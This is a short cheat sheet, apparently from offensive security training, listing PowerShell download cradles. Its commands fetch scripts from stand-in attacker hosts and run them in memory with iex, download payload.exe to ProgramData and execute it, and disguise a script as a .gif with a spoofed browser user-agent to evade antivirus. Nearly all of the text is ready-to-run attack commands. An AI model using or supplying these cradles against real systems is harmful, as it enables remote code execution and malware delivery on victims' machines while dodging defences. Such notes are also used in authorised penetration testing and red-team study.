Download cradle

PS C:\> iex (New-Object Net.Webclient).DownloadString(“http://attacker_url/script.ps1")

Powershell with double quotes
PS C:\> iex (New-Object Net.Webclient).DownloadString(“http://attacker_url/script.ps1")

Via CMD
C:\> powershell iex (New-Object Net.Webclient).DownloadString(‘http://attacker_url/script.ps1’)

Break it into peaces
PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $payload = "http://attacker_url/script.ps1"
PS C:\> $command = $downloader.DownloadString($payload)
PS C:\> Invoke-Expression $command

create a SSL certificate

AV evasion, will eecute it as a.ps1
PS C:\> iex (New-Object Net.Webclient).DownloadString(“http://attacker_url/Logo.gif")

PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
PS C:\> $payload = "http://192.168.13.62/Get-ProcessPaths.ps1"
PS C:\> $command = $downloader.DownloadString($payload)
PS C:\> iex $command

Downloader class
PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $payload = "http://attacker_URL/payload.exe"
PS C:\> $local_file = "C:\programdata\payload.exe"
PS C:\> $downloader.DownloadFile($payload,$local_file)

Executing the file once it’s on our target system can be
accomplished using the call operator (&) and variable we created
for the payload ($local_file):

PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $payload = "http://attacker_URL/payload.exe"
PS C:\> $local_file = "C:\programdata\payload.exe"
PS C:\> $downloader.DownloadFile($payload,$local_file)
PS C:\> & $local_file
